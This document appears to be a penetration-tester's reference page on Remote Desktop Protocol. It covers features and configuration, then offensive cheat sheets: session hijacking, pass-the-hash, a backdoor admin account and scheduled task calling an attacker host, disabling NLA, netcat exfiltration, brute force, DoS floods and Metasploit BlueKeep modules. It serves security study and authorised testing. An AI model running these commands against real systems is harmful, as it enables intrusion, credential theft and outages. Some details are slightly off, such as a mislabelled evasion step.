# Index
- [[Ports, Protocols, and Services]]

# Remote Desktop Protocol (RDP)

- **Port Number:** 3389
- **Protocol:** TCP/UDP
- **Service Name:** Remote Desktop Protocol (RDP)
- **Defined in:** Microsoft proprietary protocol, commonly referenced in official Microsoft documentation.

Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft that allows a user to connect to another computer over a network connection using a graphical interface. The user employs RDP client software to establish a connection to the remote computer running RDP server software. By default, RDP operates over TCP port 3389, but it can also be configured to use UDP for enhanced performance.

## Overview of Features

- **Graphical User Interface (GUI) Support:** RDP provides a full GUI experience, allowing remote users to interact with the desktop environment as if they were physically present at the machine.

- **Encrypted Communication:** RDP sessions are encrypted using 128-bit RC4 encryption by default. Newer versions support more robust encryption methods, such as TLS (Transport Layer Security).

- **Multiple Monitor Support:** RDP supports multiple monitors, allowing users to span their session across multiple displays.

- **Clipboard Sharing:** Users can share their clipboard between the local and remote machine, making it easier to transfer text, files, and other data.

- **Device Redirection:** RDP supports redirection of local devices (e.g., printers, drives, smart cards) to the remote session.

- **Session Shadowing:** Administrators can monitor or control an active user session, useful for troubleshooting or training purposes.

- **Audio and Video Streaming:** RDP supports audio redirection, allowing users to stream audio and video from the remote machine to the local machine.

- **Gateway Server Support:** RDP can be accessed over the internet securely via an RD Gateway, which encapsulates RDP in an HTTPS tunnel to avoid exposing port 3389 directly.

## Typical Use Cases

- **Remote Administration:** IT administrators use RDP to remotely manage and troubleshoot servers and workstations within an organization.

- **Remote Work:** Employees can use RDP to access their work computers from home or while traveling, ensuring they have access to all necessary applications and files.

- **Remote Support:** Helpdesk personnel use RDP to provide remote assistance, helping users solve issues on their computers without needing to be physically present.

- **Virtual Desktop Infrastructure (VDI):** RDP is often used in VDI environments to deliver virtual desktops to end-users.

## How Remote Desktop Protocol Works

1. **Client Initialization:**
   - **Step 1:** The client initiates an RDP session by sending a connection request to the server's IP address on TCP port 3389.
   - **Step 2:** The server responds by negotiating the RDP connection parameters, including encryption levels, supported features, and security mechanisms.

2. **Session Authentication:**
   - **Step 3:** The client and server exchange credentials. Authentication can be performed using standard username/password, smart cards, or other authentication mechanisms like Kerberos.
   - **Step 4:** If Network Level Authentication (NLA) is enabled, the client must authenticate before the session is fully established.

3. **Session Establishment:**
   - **Step 5:** Once authenticated, the RDP session is established. The server prepares the graphical interface and sends it to the client.
   - **Step 6:** The client displays the remote desktop, allowing the user to interact with the remote machine as if it were local.

4. **Data Exchange:**
   - **Step 7:** The client and server continuously exchange data, including GUI updates, keystrokes, mouse movements, and device redirection.
   - **Step 8:** The server processes user input and updates the GUI accordingly, sending the changes back to the client.

5. **Session Termination:**
   - **Step 9:** The user can log off or disconnect the session, at which point the server terminates the RDP session and closes the connection.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>:<attack_port>` sends RDP connection request to `<target_ip>:3389`
- **Server:** `<target_ip>:3389` responds with encryption and session negotiation
- **Client:** `<attack_ip>:<attack_port>` authenticates and establishes the session
- **Server:** `<target_ip>:3389` sends GUI data to `<attack_ip>:<attack_port>`
- **Client:** `<attack_ip>:<attack_port>` interacts with the remote desktop

# Additional Information

## Security Considerations
- **Vulnerability to Brute Force Attacks:** Since RDP is often exposed on public-facing networks, it is frequently targeted by brute force attacks to gain unauthorized access.
  
- **RDP Hijacking:** Attackers who gain access to an RDP session can hijack the session, taking over the active user's session without their knowledge.

- **Man-in-the-Middle (MITM) Attacks:** If encryption is weak or misconfigured, RDP traffic can be intercepted, allowing attackers to capture sensitive information or inject malicious commands.

- **Exploitation of RDP Vulnerabilities:** Several vulnerabilities in RDP have been discovered over the years (e.g., BlueKeep, CVE-2019-0708), making it a target for exploitation if not properly patched.

## Alternatives
- **Virtual Network Computing (VNC):** Another remote desktop protocol, often used in Linux environments, which offers similar functionality to RDP but with different security considerations.

- **Secure Shell (SSH):** For command-line access, SSH is a more secure alternative to RDP, especially in Linux-based systems.

- **Windows Remote Management (WinRM):** A protocol for remote management over HTTP, which can be an alternative to RDP for managing Windows systems.

## Advanced Usage
- **RDP over VPN:** For enhanced security, RDP sessions can be routed through a VPN, reducing the exposure of port 3389 to the internet.
  
- **Multi-factor Authentication (MFA):** Adding MFA to RDP sessions significantly enhances security by requiring additional verification beyond just a username and password.

## Modes of Operation
- **Session Mode:** Standard mode where each user gets their own isolated session.
  
- **Console Mode:** Connects directly to the console session of the remote machine, useful for certain administrative tasks.

## Configuration Files

RDP settings can be configured through various methods, including the Windows Registry, Group Policy, and RDP client configuration files.

1. **Registry Configuration:**
- **File Location:** `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server`
  - **Key Settings:**
    - `fDenyTSConnections`: Controls whether RDP connections are allowed (0 = Allowed, 1 = Denied).
    - `fSingleSessionPerUser`: Determines if users can have multiple sessions (0 = Multiple sessions allowed, 1 = Single session only).

2. **Group Policy Configuration:**
- **File Location:** `gpedit.msc` → Computer Configuration → Administrative Templates → Windows Components → Remote Desktop Services → Remote Desktop Session Host
  - **Key Settings:**
    - `Allow users to connect remotely using Remote Desktop Services`: Enables or disables RDP access.
    - `Require use of specific security layer for remote (RDP) connections`: Configures encryption level (RDP, SSL, Negotiation).

3. **RDP Client Configuration:**
- **File Location:** `.rdp` file or via the Remote Desktop Connection Manager
  - **Configuration Example:**
    ```plaintext
    screen mode id:i:1
    desktopwidth:i:1920
    desktopheight:i:1080
    session bpp:i:32
    compression:i:1
    ```
  - **Key Settings:**
    - `screen mode id`: Defines the screen mode (1 = Full-screen, 2 = Windowed).
    - `desktopwidth` & `desktopheight`: Set the dimensions of the remote desktop session.
    - `compression`: Enables or disables data compression for the session.

## Potential Misconfigurations

1. **RDP Exposed to the Internet:**
   - **Risk:** Exposing RDP to the internet without additional security measures makes it a prime target for attacks.
   - **Exploitation:** Attackers can scan for open RDP ports and launch brute force or exploit-based attacks to gain unauthorized access.

2. **Weak or No Encryption:**
   - **Risk:** If RDP is configured with weak encryption or no encryption, data transmitted during the session can be intercepted and read by attackers.
   - **Exploitation:** MITM attacks can be performed, where attackers intercept RDP traffic to steal credentials or session information.

3. **Default Port Usage:**
   - **Risk:** Using the default port 3389 for RDP makes it easier for attackers to target the service.
   - **Exploitation:** Attackers can focus on scanning for the default port to identify and attack RDP services.

4. **No Network Level Authentication (NLA):**
   - **Risk:** Without NLA, RDP sessions are established before authentication, which can expose the system to attacks like credential harvesting or session hijacking.
   - **Exploitation:** Attackers can exploit the lack of NLA to gain access to the system before credentials are validated.

## Default Credentials

RDP itself does not have default credentials as it uses the existing Windows user accounts for authentication. However, some common misconfigurations might include:

- **Administrator:**
  - **Username:** `Administrator`
  - **Password:** Commonly weak or default passwords like `admin`, `password`, `123456`, etc.

- **Guest Account (if enabled):**
  - **Username:** `Guest`
  - **Password:** Often left blank or with a weak password.

# Interaction and Tools

## Tools

### [[MSTSC]]
- **Starting RDP Session:** This command launches the Microsoft Terminal Services Client (mstsc) to connect to `<target_ip>` in full screen mode.
	```bash
	mstsc /v:<target_ip>:<target_port> /f
	```
- **Launching RDP in Admin Mode:** Connects to the remote system in console mode, useful for administrative tasks.
	```bash
	mstsc /admin /v:<target_ip>:<target_port>
	```
- **Using Remote Desktop Gateway:** Connects to the RDP server through an RD Gateway, encapsulating RDP traffic in HTTPS.
	```bash
	mstsc /v:<target_ip>:<target_port> /gateway:<gateway_ip>
	```
- **Saving RDP Settings:** Saves the connection settings to a specified file path for future use.
	```bash
	mstsc /v:<target_ip>:<target_port> /save <file_path>
	```
- **Checking RDP Status on Remote System:** Checks the status of the Remote Desktop Services on the target machine.
	```bash
	Get-Service -Name TermService
	```

### [[RDesktop]]
- **Connect to a remote computer:** (default port is 3389)
	```bash
	rdesktop -u <username> -p '<password>' <host:port>
	```
- **Connect to a remote computer with full screen:** (press Ctrl + Alt + Enter to exist)
	```bash
	rdesktop -u <username> -p '<password>' -f <host:port>
	```
- **Use the customed resolution:** (use the letter 'x' between the number)
	```bash
	rdesktop -u <username> -p '<password>' -g 1366x768 <host:port>
	```
- **Connect to a remote computer using domain user:**
	```bash
	rdesktop -u <username> -p '<password>' -d <domain_name> <host:port>
	```
- **Use the 16-bit color:** (speed up)
	```bash
	rdesktop -u <username> -p '<password>' -a 16 <host:port>
	```

### [[XFreeRDP]]
- **Connect to a XFreeRDP server:**
	```bash
	xfreerdp /d:<domain> /v:<target_ip> /u:<username>] /p:'<password>' 
	```
- **Connect to a XFreeRDP server using password hash:**
	```bash
	xfreerdp /d:<domain> /v:<target_ip> /u:<username>] /pth:'<ntlm_hash>'
	```
- **Connect to a XFreeRDP server and activate audio output redirection using sys:alsa device:**
	```bash
	xfreerdp /d:<domain> /v:<target_ip> /u:<username>] /p:'<password>' /sound:<sys:alsa>
	```
- **Connect to a XFreeRDP server with dynamic resolution:**
	```bash
	xfreerdp /d:<domain> /v:<target_ip> /u:<username>] /p:'<password>' /dynamic-resolution
	```
- **Connect to a XFreeRDP server with clipboard redirection:**
	```bash
	xfreerdp /d:<domain> /v:<target_ip> /u:<username>] /p:'<password>' +clipboard
	```
- **Connect to a XFreeRDP server ignoring any certificate checks:**
	```bash
	xfreerdp /d:<domain> /v:<target_ip> /u:<username>] /p:'<password>' /cert:ignore
	```
- **Connect to a XFreeRDP server with the local kali drive shared to the RDP session as a network drive**
	```bash
	xfreerdp /d:<domain> /v:<target_ip> /u:<username>] /p:'<password>' /drive:linux,/home/kali/ /dynamic-resolution
	```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 3389"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 3389
    ```

### [[NetCat]]
- **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 3389
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 3389 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 3389
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
	nc <target_ip> 3389 < secret_data.txt
	```

### [[SoCat Cheat Sheet]]
- **SoCat TCP Connect:** Simple tests to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:3389
	```

### [[HPing3 Cheat Sheet]]
- **Send Packet:** Send TCP packet to the service. Use `-2` to send UDP packet.
    ```bash
    hping3 <target_ip> -p 3389
    ```

## [[CrackMapExec]]
- **Password spraying:**
	```bash
	crackmapexec rdp <target_ip> -u <username> -p <password>
	```
- **Password spraying (without bruteforce):** By default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. Useful for spraying a single password against a large user list.
	```bash
	crackmapexec rdp <target_ip> -u <username_wordlist> -p <password_wordlist> --no-bruteforce
	```
- **Screenshot (connected):** Using the protocol you can perform RDP screenshot.
	```bash
	crackmapexec rdp <target_ip> -u <username> -p <password> --screenshot --screentime <second>
	```
- **Screenshot without NLA (not connected):** You can perform a screenshot of the login page of the remote host using RDP with CrackMapExec if NLA is disabled
	```bash
	crackmapexec rdp <target_ip> --nla-screenshot
	```

## Other Techniques

### RDP Tunneling over SSH
- Establish an SSH tunnel to forward RDP traffic securely over an encrypted channel.
	```bash
	ssh -L 3389:<target_ip>:3389 <attack_ip>
	```

### Enable RDP via PowerShell
- **PowerShell:**
	```bash
	Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
	Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
	```

### NLA Bypass
- Network Level Authentication (NLA) is a security feature of RDP that requires users to authenticate before a remote desktop session is established. However, misconfigurations or certain exploits can bypass NLA.
- **Disable NLA via PowerShell:**
	```bash
	Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
	```
- **Disable NLA via RegEdit:**
	```bash
	reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
	```

## RDP Session Hijacking with PowerShell
- To successfully impersonate a user without their password, we need to have `SYSTEM` privileges and use the Microsoft `tscon.exe` binary that enables users to connect to another desktop session. It works by specifying which `SESSION ID` we would like to connect to which session name. So, for example, the following command will open a new console as the specified `SESSION_ID` within our current RDP session:

	```bash
	ps > query user
	
	ps > tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
	```

- If we have local administrator privileges, we can use several methods to obtain `SYSTEM` privileges, such as PsExec or Mimikatz. A simple trick is to create a Windows service that, by default, will run as Local System and will execute any binary with `SYSTEM` privileges. We will use Microsoft `sc.exe` binary. First, we specify the service name (sessionhijack) and the binpath, which is the command we want to execute. Once we run the following command, a service named sessionhijack will be created.

	```bash
	ps > sc.exe create sessionhijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"
	
	ps > net start sessionhijack
	```

- Once the service is started, a new terminal with the lewen user session will appear. With this new account, we can attempt to discover what kind of privileges it has on the network, and maybe we'll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts or even a Domain Admin.

### Pass-The-Hash
- We may want to access applications or software installed on a user's Windows system that is only available with GUI access during a penetration test. If we have plaintext credentials for the target user, it will be no problem to RDP into the system. However, what if we only have the NT hash of the user obtained from a credential dumping attack such as SAM database, and we could not crack the hash to reveal the plaintext password? In some instances, we can perform an RDP PtH attack to gain GUI access to the target system using tools like XFreeRDP. This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`. It can be done using the following command:
	```bash
	reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
	```

- Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access:
	```bash
	xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
	```

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p <target_port>
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> <target_port>
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

## Initial Access


## Persistence

### Creating a Hidden Admin Account
- **Tool:** [[4. Tool Guides/Incomplete/PowerShell]]
	```bash
	net user hiddenadmin P@ssw0rd /add
	net localgroup administrators hiddenadmin /add
	```
- **Description:** Creates a hidden administrator account to maintain access to the system via RDP.

### Scheduled Tasks
- **Tool:** Windows Task Scheduler
    ```bash
    schtasks /create /tn "RDP_Backdoor" /tr "c:\windows\system32\cmd.exe /c mstsc /v:<attack_ip>:<attack_port>" /sc onstart
    ```
- **Description:** Creates a scheduled task that triggers an RDP session to the attacker's machine upon system startup.

### Maintaining RDP Access
- **Tool:** Windows Registry
	```bash
	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
	```
- **Description:** Ensures that RDP remains enabled even after reboots or service restarts.

## Credential Harvesting

### Packet Capture
- **Tool:** [[Wireshark]]
    ```bash
    wireshark -i <interface> -f "tcp port 3389"
    ```
- **Description:** Capture traffic and extract plaintext credentials.

### Man-in-the-Middle (MITM) Attack
- **Tool:** [[BetterCap Cheat Sheet]]
	```bash
	bettercap -iface <interface> -T <target_ip> --proxy
	```
- **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

### Pass-the-Hash Attack
- **Tool:** [[Mimikatz Cheat Sheet]]
	```bash
	sekurlsa::pth /user:Administrator /domain:<domain> /ntlm:<hash> /run:<command>
	```
- **Description:** Uses extracted NTLM hashes to authenticate to RDP without needing plaintext passwords.

## Privilege Escalation

## Internal Reconnaissance

## Lateral Movement, Pivoting, and Tunnelling

### RDP over SSH Tunneling
- **Tool:** [[SSH]]
    ```bash
    ssh -L 3389:<target_ip>:3389 <username>@<jumpbox_ip>
    mstsc /v:localhost:3389
    ```
- **Description:** Uses SSH to tunnel RDP traffic through a jump box, enabling secure remote access to an internal system.

## Defense Evasion

### Hiding RDP Connections
- **Tool:** Windows Registry
    ```bash
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "UserAuthentication" /t REG_DWORD /d 0 /f
    ```
- **Description:** Disables user authentication logging for RDP connections, making it harder for defenders to track sessions.

### Using Alternate Ports
- **Tool:** Windows Registry
	```bash
	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d <new_port> /f
	```
- **Description:** Changes the default RDP port to avoid detection by automated scans looking for open port 3389.

## Data Exfiltration

# Exploits and Attacks

## Password Attacks

### Password Brute Force
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra rdp://<target_ip> -s 3389 -l <username> -P <password_list>
    ```
- **Description:** Test a single username against multiple passwords.

### Password Spray
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra rdp://<target_ip> -s 3389 -l <username_list> -P <password>
    ```
- **Description:** Test a multiple usernames against a single password.

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

## Exploits 

### BlueKeep (CVE-2019-0708)
- **Tool:** [[Metasploit]]
    ```bash
    use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
    set RHOSTS <target_ip>
    run
    ```
- **Description:** A critical vulnerability in RDP that allows for remote code execution on vulnerable systems, potentially leading to a full system compromise.

### Terminal Server DOS (CVE-2012-0002)
- **Tool:** [[Metasploit]]
    ```bash
    use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
    set RHOST <target_ip>
    run
    ```
- **Description:** Causes a denial of service on the target RDP server by exploiting a flaw in the handling of the channel IDs.

# Resources

|**Website**|**URL**|
|-|-|
|Microsoft RDP Documentation|https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services|
|Nmap RDP Enumeration|https://nmap.org/nsedoc/scripts/rdp-enum-encryption.html|
|Metasploit BlueKeep Module|https://www.rapid7.com/db/modules/exploit/windows/rdp/cve_2019_0708_bluekeep_rce|
|CrackMapExec|https://github.com/byt3bl33d3r/CrackMapExec|
|Hydra Brute Force Tool|https://github.com/vanhauser-thc/thc-hydra|
|RDP Security Best Practices|https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/security-best-practices|
|xfreerdp Documentation|https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface|
|BlueKeep CVE-2019-0708|https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0708|
|RDP Tunneling via SSH|https://www.ssh.com/academy/ssh/tunneling/example#rdp|
|Wireshark User Guide|https://www.wireshark.org/docs/wsug_html_chunked/|